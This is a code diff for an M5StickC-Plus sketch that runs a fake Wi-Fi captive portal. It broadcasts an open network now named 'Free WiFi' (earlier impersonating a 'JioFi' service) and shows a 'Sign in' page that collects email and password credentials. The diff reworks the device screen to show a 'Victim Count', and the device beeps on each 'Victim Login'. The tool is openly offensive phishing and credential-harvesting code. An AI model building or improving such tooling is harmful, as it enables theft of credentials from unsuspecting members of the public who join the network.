@@ -4,12 +4,12 @@
 #include <WebServer.h>
 
 
-// Snagged from https://community.dfrobot.com/makelog-313463.html
-// modified font and text placement for StickC-Plus
+// Based on https://community.dfrobot.com/makelog-313463.html
+// modified font and text placement for StickC-Plus, further improvements added
 
 // User configuration
-#define SSID_NAME "JioFi L3M378"
-#define SUBTITLE "JioFi WiFi service."
+#define SSID_NAME "Free WiFi"
+#define SUBTITLE "Free WiFi service."
 #define TITLE "Sign in:"
 #define BODY "Create an account to get connected to the internet."
 #define POST_TITLE "Validating..."
@@ -18,6 +18,7 @@
 #define CLEAR_TITLE "Cleared"
 
 int capcount=0;
+int previous=-1; // stupid hack but wtfe
 int BUILTIN_LED = 10;
 
 // Init System Settings
@@ -81,7 +82,7 @@ String clear() {
   String email = "<p></p>";
   String password = "<p></p>";
   Credentials = "<p></p>";
-  return header(CLEAR_TITLE) + "<div><p>The credentials list has been reseted.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
+  return header(CLEAR_TITLE) + "<div><p>The credentials list has been reset.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
 }
 
 void BLINK() { // The internal LED will blink 5 times when a password is received.
@@ -102,20 +103,6 @@ void setup() {
   M5.Lcd.setSwapBytes(true);
   M5.Lcd.setTextSize(2);
 
-  M5.Lcd.setTextColor(TFT_RED, TFT_BLACK);
-  M5.Lcd.setCursor(0, 10);
-  M5.Lcd.print("M5Stick C Cap Portal");
-
-  M5.Lcd.setTextColor(TFT_GREEN, TFT_BLACK);
-  M5.Lcd.setCursor(0, 25);
-  M5.Lcd.print("WiFi IP: ");
-  M5.Lcd.print(APIP);
-
-  M5.Lcd.setTextColor(TFT_GREEN, TFT_BLACK);
-  M5.Lcd.setCursor(0, 35);
-  M5.Lcd.print("Victim Count: ");
-  M5.Lcd.print(capcount);
-
   bootTime = lastActivity = millis();
   WiFi.mode(WIFI_AP);
   WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
@@ -125,10 +112,10 @@ void setup() {
   webServer.on("/post", []() {
     capcount=capcount+1;
     webServer.send(HTTP_CODE, "text/html", posted());
-    M5.Lcd.setTextColor(TFT_GREEN, TFT_BLACK);
-    M5.Lcd.setCursor(0, 75);
-    M5.Lcd.print("status: ");
-    M5.Lcd.print("Victim In");
+    M5.Beep.tone(4000);
+    M5.Lcd.print("Victim Login");
+    delay(50);
+    M5.Beep.mute();
     BLINK();
     M5.Lcd.fillScreen(BLACK);
   });
@@ -152,24 +139,22 @@ void setup() {
 void loop() {
   if ((millis() - lastTick) > TICK_TIMER) {
     lastTick = millis();
+    if(capcount > previous){
+      previous = capcount;
     
-    M5.Lcd.fillScreen(BLACK);
-    M5.Lcd.setSwapBytes(true);
-    M5.Lcd.setTextSize(2);
-
-    M5.Lcd.setTextColor(TFT_RED, TFT_BLACK);
-    M5.Lcd.setCursor(0, 10);
-    M5.Lcd.print("M5Stick C Cap Portal");
-
-    M5.Lcd.setTextColor(TFT_GREEN, TFT_BLACK);
-    M5.Lcd.setCursor(0, 35);
-    M5.Lcd.print("WiFi IP: ");
-    M5.Lcd.print(APIP);
-
-    M5.Lcd.setTextColor(TFT_GREEN, TFT_BLACK);
-    M5.Lcd.setCursor(0, 55);
-    M5.Lcd.print("Victim Count: ");
-    M5.Lcd.print(capcount);
+      M5.Lcd.fillScreen(BLACK);
+      M5.Lcd.setSwapBytes(true);
+      M5.Lcd.setTextSize(2);
+      M5.Lcd.setTextColor(TFT_RED, TFT_BLACK);
+      M5.Lcd.setCursor(0, 10);
+      M5.Lcd.print("CAPTIVE PORTAL");
+      M5.Lcd.setTextColor(TFT_GREEN, TFT_BLACK);
+      M5.Lcd.setCursor(0, 35);
+      M5.Lcd.print("WiFi IP: ");
+      M5.Lcd.println(APIP);
+      M5.Lcd.printf("SSID: %s\n", SSID_NAME);
+      M5.Lcd.printf("Victim Count: %d\n", capcount);
+    }
   }
   dnsServer.processNextRequest(); webServer.handleClient();
 }
